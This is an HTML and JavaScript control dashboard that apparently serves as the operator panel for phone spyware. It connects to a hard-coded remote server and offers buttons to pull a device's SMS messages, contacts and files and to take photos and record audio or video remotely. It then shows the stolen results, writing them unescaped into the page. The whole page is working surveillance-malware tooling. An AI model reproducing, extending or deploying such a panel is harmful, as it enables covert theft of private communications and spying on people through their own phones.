<!DOCTYPE html>
<html>
<head>
    <title>Device Controller</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #3a6ea5;
            font-family: 'Tahoma', 'Segoe UI', Arial, sans-serif;
            padding: 20px;
            min-height: 100vh;
        }
        
        .window {
            background: #ece9d8;
            border: 2px solid;
            border-color: #ffffff #404040 #404040 #ffffff;
            max-width: 900px;
            margin: 0 auto;
            box-shadow: 4px 4px 10px rgba(0,0,0,0.5);
        }
        
        .window-title {
            background: linear-gradient(to right, #0a246a, #3a6ea5);
            color: white;
            padding: 6px 10px;
            font-weight: bold;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: default;
        }
        
        .window-title .buttons {
            display: flex;
            gap: 4px;
        }
        
        .window-title .btn {
            width: 18px;
            height: 18px;
            border: 1px solid;
            background: #ece9d8;
            font-size: 11px;
            text-align: center;
            line-height: 16px;
            cursor: pointer;
            color: black;
        }
        
        .window-title .btn-close {
            background: #c00000;
            color: white;
            border-color: #8c0000;
        }
        
        .window-body {
            padding: 15px;
        }
        
        .status-bar {
            background: #d4d0c8;
            padding: 6px 12px;
            border: 1px solid;
            border-color: #404040 #ffffff #ffffff #404040;
            margin-bottom: 15px;
            font-size: 13px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .status-dot {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-dot.online { background: #00aa00; }
        .status-dot.offline { background: #cc0000; }
        
        .button-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 8px;
            margin: 15px 0;
        }
        
        .btn-xp {
            background: #ece9d8;
            border: 2px solid;
            border-color: #ffffff #808080 #808080 #ffffff;
            padding: 10px 12px;
            font-family: 'Tahoma', Arial, sans-serif;
            font-size: 13px;
            cursor: pointer;
            text-align: center;
            color: #000;
            transition: all 0.1s;
        }
        
        .btn-xp:hover {
            background: #d4d0c8;
            border-color: #f0f0f0 #404040 #404040 #f0f0f0;
        }
        
        .btn-xp:active {
            border-color: #808080 #ffffff #ffffff #808080;
        }
        
        .btn-xp.primary {
            background: #d4e6f7;
            font-weight: bold;
        }
        
        .btn-xp.primary:hover {
            background: #b8d4ed;
        }
        
        .btn-xp.danger {
            background: #f7d4d4;
        }
        
        .btn-xp.danger:hover {
            background: #edb8b8;
        }
        
        .output-box {
            background: #ffffff;
            border: 2px solid;
            border-color: #808080 #ffffff #ffffff #808080;
            padding: 12px;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #000;
            white-space: pre-wrap;
            word-wrap: break-word;
            margin-top: 15px;
        }
        
        .output-box .timestamp {
            color: #808080;
        }
        
        .output-box .success {
            color: #006600;
        }
        
        .output-box .error {
            color: #cc0000;
        }
        
        .output-box .info {
            color: #0000cc;
        }
        
        .footer {
            margin-top: 15px;
            padding-top: 10px;
            border-top: 1px solid #808080;
            font-size: 11px;
            color: #404040;
            text-align: center;
        }
        
        .device-id {
            font-size: 11px;
            color: #404040;
        }
        
        ::-webkit-scrollbar {
            width: 14px;
        }
        
        ::-webkit-scrollbar-track {
            background: #d4d0c8;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #c0c0c0;
            border: 1px solid #808080;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #a0a0a0;
        }
        
        @media (max-width: 600px) {
            .button-grid {
                grid-template-columns: 1fr 1fr;
            }
            .window-body {
                padding: 10px;
            }
        }
    </style>
</head>
<body>

<div class="window">
    <div class="window-title">
        <span>Device Controller</span>
        <div class="buttons">
            <span class="btn">-</span>
            <span class="btn">[ ]</span>
            <span class="btn btn-close">X</span>
        </div>
    </div>
    
    <div class="window-body">
        <div class="status-bar">
            <span>
                <span class="status-dot offline" id="statusDot"></span>
                <span id="statusText">Disconnected</span>
            </span>
            <span class="device-id" id="deviceId">No device connected</span>
        </div>
        
        <div class="button-grid">
            <button class="btn-xp primary" onclick="sendCommand('get_sms')">Get SMS</button>
            <button class="btn-xp primary" onclick="sendCommand('get_contacts')">Get Contacts</button>
            <button class="btn-xp primary" onclick="sendCommand('get_files')">Get Files</button>
            <button class="btn-xp" onclick="sendCommand('take_photo')">Take Photo</button>
            <button class="btn-xp" onclick="sendCommand('record_audio')">Record Audio</button>
            <button class="btn-xp" onclick="sendCommand('record_video')">Record Video</button>
            <button class="btn-xp" onclick="sendCommand('get_status')">Get Status</button>
            <button class="btn-xp danger" onclick="sendCommand('stop')">Stop Service</button>
        </div>
        
        <div class="output-box" id="output">Ready... waiting for commands.</div>
        
        <div class="footer">
            <span id="timestamp">Ready</span>
        </div>
    </div>
</div>

<script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
<script>
    const SERVER_URL = 'https://unbanserverlive1.onrender.com';
    const socket = io(SERVER_URL);
    
    const output = document.getElementById('output');
    const statusText = document.getElementById('statusText');
    const statusDot = document.getElementById('statusDot');
    const deviceId = document.getElementById('deviceId');
    const timestampEl = document.getElementById('timestamp');
    
    let connectedDevice = null;
    
    function log(message, type) {
        const time = new Date().toLocaleTimeString();
        const prefix = '[' + time + '] ';
        let className = '';
        if (type === 'success') className = 'success';
        else if (type === 'error') className = 'error';
        else if (type === 'info') className = 'info';
        
        const line = '<span class="timestamp">' + prefix + '</span><span class="' + className + '">' + message + '</span>\n';
        output.innerHTML = line + output.innerHTML;
        if (output.children.length > 100) {
            output.removeChild(output.lastChild);
        }
    }
    
    function updateStatus(online, id) {
        if (online) {
            statusText.textContent = 'Connected';
            statusDot.className = 'status-dot online';
            if (id) {
                deviceId.textContent = 'Device: ' + id;
                connectedDevice = id;
            }
        } else {
            statusText.textContent = 'Disconnected';
            statusDot.className = 'status-dot offline';
            deviceId.textContent = 'No device connected';
            connectedDevice = null;
        }
    }
    
    // Socket events
    socket.on('connect', function() {
        log('Connected to server', 'success');
        updateStatus(false);
        timestampEl.textContent = 'Connected to server';
    });
    
    socket.on('disconnect', function() {
        log('Disconnected from server', 'error');
        updateStatus(false);
        timestampEl.textContent = 'Disconnected';
    });
    
    socket.on('connect_error', function(err) {
        log('Connection error: ' + err.message, 'error');
        updateStatus(false);
    });
    
    socket.on('device_status', function(data) {
        log('Status: ' + data.status + ' - ' + data.detail, 'info');
        if (data.status === 'online') {
            updateStatus(true, data.device_id);
        } else {
            updateStatus(false);
        }
        timestampEl.textContent = 'Last status: ' + new Date(data.timestamp).toLocaleTimeString();
    });
    
    socket.on('device_data', function(data) {
        let type = data.type || 'unknown';
        let content = data.data || '';
        
        log('Received: ' + type, 'success');
        
        try {
            if (type === 'sms') {
                const smsData = JSON.parse(content);
                log('SMS Count: ' + smsData.count, 'info');
                if (smsData.data && smsData.data.length > 0) {
                    const first = JSON.parse(smsData.data)[0];
                    log('Sample SMS: ' + first.address + ' - ' + first.body.substring(0, 50), 'info');
                }
            } else if (type === 'contacts') {
                const contactData = JSON.parse(content);
                log('Contact Count: ' + contactData.count, 'info');
            } else if (type === 'files') {
                const fileData = JSON.parse(content);
                log('File Count: ' + fileData.count, 'info');
            } else if (type === 'photo') {
                log('Photo captured successfully', 'success');
            } else if (type === 'audio') {
                log('Audio recording started', 'success');
            } else if (type === 'video') {
                log('Video recording started', 'success');
            } else if (type === 'error') {
                log('Error: ' + content, 'error');
            } else {
                log('Data: ' + content.substring(0, 200), 'info');
            }
        } catch (e) {
            log('Data received: ' + content.substring(0, 200), 'info');
        }
        
        timestampEl.textContent = 'Last data: ' + new Date(data.timestamp).toLocaleTimeString();
    });
    
    function sendCommand(cmd) {
        if (!connectedDevice) {
            log('No device connected!', 'error');
            return;
        }
        
        log('Sending command: ' + cmd, 'info');
        socket.emit('send_command', { cmd: cmd });
        timestampEl.textContent = 'Command sent: ' + cmd + ' at ' + new Date().toLocaleTimeString();
    }
    
    // Initial status
    log('Dashboard ready. Waiting for device connection...', 'info');
    updateStatus(false);
</script>

</body>
</html>
